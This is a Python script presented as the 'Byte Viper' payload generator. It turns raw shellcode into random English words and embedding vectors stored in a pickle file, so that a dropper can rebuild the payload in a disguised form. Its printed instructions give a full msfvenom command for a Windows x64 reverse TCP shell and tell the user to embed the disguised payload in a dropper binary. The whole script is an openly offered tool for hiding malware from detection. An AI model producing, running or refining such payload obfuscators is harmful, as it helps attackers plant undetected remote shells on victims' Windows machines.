import subprocess
import importlib

packages = ['pandas','sentence_transformers', 'pickle', 'capstone', 'random_word', 'termcolor', 'Pyfiglet']

for package in packages:
  try:
      importlib.import_module(package)
  except ImportError:
      subprocess.run(['python', '-m', 'pip', 'install', package, '-q', '--no-input', '--no-python-version-warning'])

import pyfiglet

pyfiglet.print_figlet("Byte", font="poison",colors="red", justify="center")
pyfiglet.print_figlet("Viper", font="poison",colors="green", justify="center")

import pandas as pd
from sentence_transformers import SentenceTransformer, util
import torch
import pickle
from random_word import RandomWords
from capstone import *

print("This is a payload generator created by Byte Viper AI engine.\n")
print("It converts raw hex code payload (for example msf venom) to its mathematical representations in vectors using a pre-trained machine-learning model\n\n")
print("*******INSTRUCTIONS START:*******\n")
print("1. Create a working payload. For instance, msf venom payload would be\n")
print("\"msfvenom  -p x64 --platform windows -p windows/x64/shell_reverse_tcp lhost=<your host ipv4> lport=<your port> -f c\"\n")
print("You would get something like \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50.....\"\n")
print("Remove all \\x and \" so that you are left with fc4883e4f0e8c000000041514150....\n")
print("Use this as your input next\n")
print("2. You would receive the AI generated payload which you embed it in your code\n")
print("3. A pkl file would be created that hold the vectors\n")
print("4. Place this file, in the same path, along with your dropper binary\n")
print("5. Place payload.py, in the same path, along with your dropper\n\n")
print("*******INSTRUCTIONS END*******\n")

hex_bytes = input('Enter hex values of your payload (No "0x" or "\\x" format, just plain hex values). Example: 55488b05b8130000:\n\n')
print("Creating vectors. Please be patient...\n\n")
bytecode = bytes.fromhex(hex_bytes)
cs_instance = Cs(CS_ARCH_X86, CS_MODE_64)

df_dataset = pd.DataFrame(columns=['English','Opcode'])

eng_list = []
op_list = []

for instruction in cs_instance.disasm(bytecode, 0x1000):
    opcode_hex = ','.join(f"0x{byte:02x}" for byte in instruction.bytes)
    eng_word = RandomWords().get_random_word()
    op_list.append(opcode_hex)
    eng_list.append(eng_word)


df_dataset['English'] = eng_list
df_dataset['Opcode'] = op_list

model_name = 'nq-distilbert-base-v1'
model = SentenceTransformer(model_name)

df_dataset['embedding'] = (df_dataset['English'].astype(str)).apply(lambda x: model.encode(x, convert_to_tensor=True, normalize_embeddings=True))
s = '","'.join(df_dataset["English"])
df_dataset = df_dataset.drop('English',axis=1)
df_dataset.sample(frac=1)
df_dataset.to_pickle('opcode_embeddings.pkl')

print("Copy payload exactly in your C code:\n\n")
print('{"' + s + '"}\n\n')
print("There is a pkl file created with the name \'opcode_embeddings.pkl\'.\nPlace this file, in the same path, as your dropper:\n\n")
print("Also, place payload.py, in the same path, along with your dropper\n")
print("Payload generation complete!\n\n")
